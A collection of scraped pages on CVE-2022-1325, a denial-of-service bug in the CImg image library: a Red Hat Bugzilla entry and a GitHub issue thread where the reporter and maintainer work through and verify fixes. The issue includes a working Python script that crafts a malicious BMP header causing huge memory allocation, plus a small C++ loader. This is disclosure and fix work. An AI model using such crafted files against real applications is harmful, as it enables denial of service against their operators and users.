[OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | medium | | [Severity:](page.cgi?id=fields.html#bug_severity) | medium | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [2074550](show_bug.cgi?id=2074550 "CLOSED EOL - CVE-2022-1325 CImg: Denial of service via RAM exhaustion in _load_bmp [fedora-all]") | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [2074551](show_bug.cgi?id=2074551) | | TreeView+ | [depends on](buglist.cgi?bug_id=2074549&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=2074549&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2022-04-12 13:24 UTC by Pedro Sampaio | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2022-04-22 18:24 UTC ([History](show_activity.cgi?id=2074549)) | | [CC List:](page.cgi?id=fields.html#cclist) | 2 users (show)  berrange i | | Fixed In Version: |  | | | Doc Type: | If docs needed, set a value | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2022-04-12 15:26:39 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | | |  |
| --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=2074549#c0)  Pedro Sampaio    2022-04-12 13:24:51 UTC  ``` In CImg 3.10, via a maliciously crafted bmp file with modified dx and dy header field values it is possible to trick the application into allocating huge buffer sizes like 64 Gigabyte upon reading the file from disk or from a virtual buffer.  Upstream issue:  <https://github.com/dtschump/CImg/issues/343>   ```  [Comment 1](show_bug.cgi?id=2074549#c1)  Pedro Sampaio    2022-04-12 13:25:52 UTC  ``` Created CImg tracking bugs for this issue:  Affects: fedora-all [[bug 2074550](show_bug.cgi?id=2074550 "CLOSED EOL - CVE-2022-1325 CImg: Denial of service via RAM exhaustion in _load_bmp [fedora-all]")]   ```  [Comment 2](show_bug.cgi?id=2074549#c2)  Product Security DevOps Team    2022-04-12 15:26:37 UTC  ``` This CVE Bugzilla entry is for community support informational purposes only as it does not affect a package in a commercially supported Red Hat product. Refer to the dependent bugs for status of those individual community products.   ```  [Comment 3](show_bug.cgi?id=2074549#c3)  Pedro Sampaio    2022-04-22 18:24:33 UTC  ``` Upstream fix:  <https://github.com/dtschump/cimg/commit/619cb58dd90b4e03ac68286c70ed98acbefd1c90>   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=2074549&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from huntr.dev_91d5a31a_20250114_201602.html ===


* [![logo](/horizontal-logo-wh.svg)](/)
* [Bounties](/bounties)
* [Partners](/partners)
* Community
* Info
[SUBMIT REPORT](/bounties/disclose)

Supported by¬†[Protect AI](https://protectai.com/)¬†and leading the way to [MLSecOps](https://mlsecops.com) and greater AI security.

¬© 2024

[Privacy Policy](/privacy)[Terms of Service](/terms)[Code of Conduct](/code-of-conduct)Cookie Preferences[Contact Us](/contact-us)

=== Content from github.com_4a122ab5_20250114_201559.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGreycLab%2FCImg%2Fissues%2F343)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGreycLab%2FCImg%2Fissues%2F343)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=GreycLab%2FCImg)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[GreycLab](/GreycLab)
/
**[CImg](/GreycLab/CImg)**
Public

* [Notifications](/login?return_to=%2FGreycLab%2FCImg) You must be signed in to change notification settings
* [Fork
  286](/login?return_to=%2FGreycLab%2FCImg)
* [Star
   1.5k](/login?return_to=%2FGreycLab%2FCImg)

* [Code](/GreycLab/CImg)
* [Issues
  84](/GreycLab/CImg/issues)
* [Pull requests
  0](/GreycLab/CImg/pulls)
* [Actions](/GreycLab/CImg/actions)
* [Projects
  0](/GreycLab/CImg/projects)
* [Wiki](/GreycLab/CImg/wiki)
* [Security](/GreycLab/CImg/security)
* [Insights](/GreycLab/CImg/pulse)

Additional navigation options

* [Code](/GreycLab/CImg)
* [Issues](/GreycLab/CImg/issues)
* [Pull requests](/GreycLab/CImg/pulls)
* [Actions](/GreycLab/CImg/actions)
* [Projects](/GreycLab/CImg/projects)
* [Wiki](/GreycLab/CImg/wiki)
* [Security](/GreycLab/CImg/security)
* [Insights](/GreycLab/CImg/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FGreycLab%2FCImg%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FGreycLab%2FCImg%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Denial of service via RAM exhaustion in \_load\_bmp #343

Closed

[7unn3l](/7unn3l) opened this issue
Apr 2, 2022
¬∑ 18 comments

Closed

# [Denial of service via RAM exhaustion in \_load\_bmp](#top) #343

[7unn3l](/7unn3l) opened this issue
Apr 2, 2022
¬∑ 18 comments

## Comments

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=80&u=4030ff7b2b14b56b334d84213535464d6c7ce533&v=4)](/7unn3l)

Copy link

### **[7unn3l](/7unn3l)** commented [Apr 2, 2022](#issue-1190640729) ‚Ä¢ edited Loading

| Description Via a maliciously crafted pandore or bmp file with modified dx and dy header field values it is possible to trick the application into allocating huge buffer sizes like 64 Gigabyte upon reading the file from disk or from a virtual buffer. Version This does affect the newest Version of Cimg which is 3.10, commit [607aea7](https://github.com/GreycLab/CImg/commit/607aea7c89fd66470e58a77b126584132d9af8f8) as the time of writing. Proof of Concept Due to the fact that I cannot attach bmp files in this format, here is a small python script that will generate a bmp file with given dimmensions. Note that the final buffer size is calculated by multiplying the product of width and height by 3. This code snippet uses a sample value of 5 GB.  ``` import struct  def write_size(dx,dy):     x = struct.pack('I',dx)     y = struct.pack('I',dy)          min_bmp_head = list(                b'BM\xf2Y\x03\x00\x00\x00\x00\x006\x04\x00\x00(\x00\x00\x00 \                V\xa8\xab1\x02\x00\x00\x00\x01\x00\x08\x00\x00\x00\x00\x00 \                \xbcU\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00 \                \x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x01\x01\x00\x03\x03'                         )      min_bmp_head[0x12] = x[0]     min_bmp_head[0x13] = x[1]     min_bmp_head[0x14] = x[2]     min_bmp_head[0x15] = x[3]      min_bmp_head[0x16] = y[0]     min_bmp_head[0x17] = y[1]     min_bmp_head[0x18] = y[2]     min_bmp_head[0x19] = y[3]      open('crash.bmp','wb').write(bytes(min_bmp_head))  write_size(833333334,2) # use these two parameters to control dx and dy of the image. 833333334,2 for 5 GB  ```  then read the file via standard methods:  ``` #define cimg_display 0 #include "CImg.h" #include <iostream>  int main(int argc,const char* argv[]){      if (argc < 2){         printf("no img\n");         exit(1);     }      cimg_library::CImg<unsigned char> img;     img.assign(argv[1]); }  ```  The code was compiled with g++ version 9.4.0 on Ubuntu 9.4.0-1ubuntu1~20.04 via `g++ test.cpp -o ./test -ljpeg -lpng` Root cause *line numbers refer to main branch with commit [927fee5](https://github.com/GreycLab/CImg/commit/927fee511fe4fcc1ae5cdf2365a60048fe4ff935)*  altough safe\_size (line 11771) does check for overflows of the size\_t type, it does allow very large values . One would think that the try/catch block `try { _data = new T[siz]; }` (line 11885) does not allow for allocations that are too big and would completely circumvent this attack but actually, allocations that are equal to the maximum available RAM of a system or even numbers that are a bit higher (I tested the 5 GB case on a 4GB RAM machine) will *not* thorw an exception like std::bad\_alloc. Impact This vulnerability allows an attacker who can send images to an application to force an premature process exit and exhaust system memory, potentially leading to a full system denial of service. Prevention One could define a global constant that regulates the maximum value safe\_size can return. The user then could change the default value depending on context. |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=80&u=4030ff7b2b14b56b334d84213535464d6c7ce533&v=4)](/7unn3l)

Copy link

Author

### **[7unn3l](/7unn3l)** commented [Apr 6, 2022](#issuecomment-1090382561)

| update: apparently the same type of bug also affects .pandore files |
| --- |

All reactions

Sorry, something went wrong.

[![@dtschump](https://avatars.githubusercontent.com/u/10114565?s=80&u=fbdc65fa0cd1746697014bb7a10a7052cc63f081&v=4)](/dtschump)

Copy link

Collaborator

### **[dtschump](/dtschump)** commented [Apr 7, 2022](#issuecomment-1091459233)

| Thanks. I will investigate. For now, I've just run your Python code, this generated a very small `.bmp` file `crash.bmp` of size 746 bytes. When I try reading it with CImg (3.1.0\_pre), the bmp format is not recognized:  ``` [CImg] *** CImgIOException *** [instance(0,0,0,0,(nil),non-shared)] CImg<float>::load(): Failed to recognize format of file 'crash.bmp'.  ```  I suppose this is not expected? |
| --- |

All reactions

Sorry, something went wrong.

[![@dtschump](https://avatars.githubusercontent.com/u/10114565?s=80&u=fbdc65fa0cd1746697014bb7a10a7052cc63f081&v=4)](/dtschump)

Copy link

Collaborator

### **[dtschump](/dtschump)** commented [Apr 7, 2022](#issuecomment-1091506729)

| OK, was using Python 2.7 (the one by default). With Python3, the generated file is in binary mode and reproduce the bug. |
| --- |

All reactions

Sorry, something went wrong.

[![@dtschump](https://avatars.githubusercontent.com/u/10114565?s=80&u=fbdc65fa0cd1746697014bb7a10a7052cc63f081&v=4)](/dtschump)

Copy link

Collaborator

### **[dtschump](/dtschump)** commented [Apr 7, 2022](#issuecomment-1091530737)

| Hum, still not look like a .bmp file anyway (112 bytes):  ``` $ file crash.bmp  crash.bmp: data  ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@dtschump](https://avatars.githubusercontent.com/u/10114565?s=80&u=fbdc65fa0cd1746697014bb7a10a7052cc63f081&v=4)](/dtschump)

Copy link

Collaborator

### **[dtschump](/dtschump)** commented [Apr 7, 2022](#issuecomment-1091562304)

| Anyway, I've added some code to check the validity of files. It should help: [619cb58](https://github.com/GreycLab/CImg/commit/619cb58dd90b4e03ac68286c70ed98acbefd1c90) |
| --- |

All reactions

Sorry, something went wrong.

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=80&u=4030ff7b2b14b56b334d84213535464d6c7ce533&v=4)](/7unn3l)

Copy link

Author

### **[7unn3l](/7unn3l)** commented [Apr 7, 2022](#issuecomment-1091654711) ‚Ä¢ edited Loading

| Hello,  Thanks for responding. Regarding the question if crash.bmp is still valid: I get:  ``` user@lnx:/mnt/c/Users/user/Desktop/cimg_fuzz_prod_finds/bmp_RAM_exhaustion$ uname -a Linux lnx 5.10.16.3-microsoft-standard-WSL2 #1 SMP Fri Apr 2 22:23:49 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux  user@lnx:/mnt/c/Users/user/Desktop/cimg_fuzz_prod_finds/bmp_RAM_exhaustion$ file -v file-5.41 magic file from /etc/magic:/usr/share/misc/magic  user@lnx:/mnt/c/Users/user/Desktop/cimg_fuzz_prod_finds/bmp_RAM_exhaustion$ python3 ./test.py  user@lnx:/mnt/c/Users/user/Desktop/cimg_fuzz_prod_finds/bmp_RAM_exhaustion$ file crash.bmp crash.bmp: PC bitmap, Windows 3.x format, 833333334 x 2 x 8224, 538976288 compression, image size 833333334, resolution 2 x 524289 px/m, 538976288 important colors, cbSize 219634, bits offset 1078  ```  so on my system, it still shows up as a valid bmp file |
| --- |

All reactions

Sorry, something went wrong.

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=80&u=4030ff7b2b14b56b334d84213535464d6c7ce533&v=4)](/7unn3l)

Copy link

Author

### **[7unn3l](/7unn3l)** commented [Apr 7, 2022](#issuecomment-1091666995)

| Regarding [619cb58](https://github.com/GreycLab/CImg/commit/619cb58dd90b4e03ac68286c70ed98acbefd1c90), I think this wont work when reading a virtual file buffer (`FILE*`). Because of `cimg::type<ulongT>::max()`, the maximum size ist a very large number (18446744073709551615 on my system), allowing for the same bug to occur again.  When reading the file from disk, the check seems fine to me. It is notable however, that with a large file, one would still be able to cause a big memory allocation but this is not as critical since sending e.g a 4 GB file to an application would probably be prohibted by other sources |
| --- |

All reactions

Sorry, something went wrong.

[![@dtschump](https://avatars.githubusercontent.com/u/10114565?s=80&u=fbdc65fa0cd1746697014bb7a10a7052cc63f081&v=4)](/dtschump)

Copy link

Collaborator

### **[dtschump](/dtschump)** commented [Apr 7, 2022](#issuecomment-1091670457)

| I think this wont work when reading a virtual file buffer (FILE\*)  Indeed, but in this case, as the data are read byte by byte, there is not much we can do, because there is actually no way of knowing the amount of data that will be passed through the `(FILE*)`, so we have to "trust" what is put inside. I could of course add a "limit" in this case (setting `fsiz` to some smaller value), but this would mean that valid image data larger than that could not be read, which is really annoying. |
| --- |

All reactions

Sorry, something went wrong.

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=80&u=4030ff7b2b14b56b334d84213535464d6c7ce533&v=4)](/7unn3l)

Copy link

Author

### **[7unn3l](/7unn3l)** commented [Apr 7, 2022](#issuecomment-1091722017)

| Ah thanks, I see the problem here. How about making the limit user controllable? It could have an initial value and then be user stettable. Im thinking of something like `cimg_libraray::MAX_PX_SIZE` . This would help developers when the application needs to parse user controlled streams and rescources are limited. |
| --- |

All reactions

Sorry, something went wrong.

[![@dtschump](https://avatars.githubusercontent.com/u/10114565?s=80&u=fbdc65fa0cd1746697014bb7a10a7052cc63f081&v=4)](/dtschump)

Copy link

Collaborator

### **[dtschump](/dtschump)** commented [Apr 7, 2022](#issuecomment-1091753659)

| So, [193abd7](https://github.com/GreycLab/CImg/commit/193abd7b29f3686840a48702d26aa3bf29deac3e) is a start :) |
| --- |

All reactions

Sorry, something went wrong.

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=80&u=4030ff7b2b14b56b334d84213535464d6c7ce533&v=4)](/7unn3l)

Copy link

Author

### **[7unn3l](/7unn3l)** commented [Apr 7, 2022](#issuecomment-1091813665)

| I agree! ^^  Now I wonder if this limit should also be used in other places, but at the moment I dont have time to investigate. Maybe one could integrate this check into `safe_size` but I guess this is a topic for another issue.  I will quickly verify if [193abd7](https://github.com/GreycLab/CImg/commit/193abd7b29f3686840a48702d26aa3bf29deac3e) fixes the crash on my machine... |
| --- |

All reactions

Sorry, something went wrong.

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=80&u=4030ff7b2b14b56b334d84213535464d6c7ce533&v=4)](/7unn3l)

Copy link

Author

### **[7unn3l](/7unn3l)** commented [Apr 7, 2022](#issuecomment-1091891849) ‚Ä¢ edited Loading

| okay so the old crashing images do not crash anymore üëç However, I have found another pandore sample, that also crashes wih RAM exhaustion and seems to get around the checks. I will investigate in the near future and report as soon as I have found the root cause. For bmp files however it looks fixed so far :D |
| --- |

All reactions

Sorry, something went wrong.

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=80&u=4030ff7b2b14b56b334d84213535464d6c7ce533&v=4)](/7unn3l)

Copy link

Author

### **[7unn3l](/7unn3l)** commented [Apr 11, 2022](#issuecomment-1095254570)

| Hello again,  The statement that I've made about pandore files is wrong. It was a mistake on my end.  **The fix seems to prevent RAM exhaustion in both filetypes** ‚úîÔ∏è  Thank you for your time and dedication :) |
| --- |

All reactions

Sorry, something went wrong.

[![@JamieSlome](https://avatars.githubusercontent.com/u/55323451?s=80&u=c125f829f1fd011e9c564e82e3fb87ad98d7e0a4&v=4)](/JamieSlome)

Copy link

### **[JamieSlome](/JamieSlome)** commented [Apr 14, 2022](#issuecomment-1099293777)

| Just attaching the initial report for reference:  <https://huntr.dev/bounties/a5e4fc45-8f14-4dd1-811b-740fc50c95d2/> |
| --- |

All reactions

Sorry, something went wrong.

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=80&u=4030ff7b2b14b56b334d84213535464d6c7ce533&v=4)](/7unn3l)

Copy link

Author

### **[7unn3l](/7unn3l)** commented [Apr 25, 2022](#issuecomment-1108924906) ‚Ä¢ edited Loading

| Hello, there is a small update: I've been investigating the loading process a bit more and actually found a bypass for the proposed fix. It has to do with buffers that are allocated without size checking through cimg\_max\_file\_size when loading image files via \_load\_XX. In this instance, I've found the bypass again in the bmp loading process but since this is a general problem (and I am certain that this problem will also occur in other parts of the lib), Ive made a pull request [#348](https://github.com/GreycLab/CImg/pull/348) to address it.  Ive fuzzed the image loading process of ascii,analyze,inr,pnm,bmp,pandore,dlm and pfm files and not found a single RAM exhaustion with this new change :)  Edit: I see that it is merged already. Thanks! |
| --- |

All reactions

Sorry, something went wrong.

[![@JamieSlome](https://avatars.githubusercontent.com/u/55323451?s=80&u=c125f829f1fd011e9c564e82e3fb87ad98d7e0a4&v=4)](/JamieSlome)

Copy link

### **[JamieSlome](/JamieSlome)** commented [Apr 26, 2022](#issuecomment-1109656310)

| [@7unn3l](https://github.com/7unn3l) - thanks for the heads up. I have added a comment to the report for reference. |
| --- |

All reactions

Sorry, something went wrong.

[![@tillea](https://avatars.githubusercontent.com/u/9447939?s=80&u=f52caaf368a5c3243fd0b3287d5ad21e88f5deef&v=4)](/tillea)

Copy link

### **[tillea](/tillea)** commented [Sep 27, 2022](#issuecomment-1259047400)

| Hi, this is just a gentle ping on this issue. Any news about a fix? |
| --- |

All reactions

Sorry, something went wrong.

[![@dtschump](https://avatars.githubusercontent.com/u/10114565?s=80&u=fbdc65fa0cd1746697014bb7a10a7052cc63f081&v=4)](/dtschump)

Copy link

Collaborator

### **[dtschump](/dtschump)** commented [Sep 27, 2022](#issuecomment-1259136029)

| To me, it has been fixed already. See <https://huntr.dev/bounties/a5e4fc45-8f14-4dd1-811b-740fc50c95d2/> |
| --- |

All reactions

Sorry, something went wrong.

[![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=40&u=4030ff7b2b14b56b334d84213535464d6c7ce533&v=4)](/7unn3l)
[7unn3l](/7unn3l)
closed this as [completed](/GreycLab/CImg/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Sep 27, 2022](#event-7466409700)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FGreycLab%2FCImg%2Fissues%2F343)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

4 participants

[![@tillea](https://avatars.githubusercontent.com/u/9447939?s=52&v=4)](/tillea) [![@dtschump](https://avatars.githubusercontent.com/u/10114565?s=52&v=4)](/dtschump) [![@7unn3l](https://avatars.githubusercontent.com/u/32908487?s=52&v=4)](/7unn3l) [![@JamieSlome](https://avatars.githubusercontent.com/u/55323451?s=52&v=4)](/JamieSlome)

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.


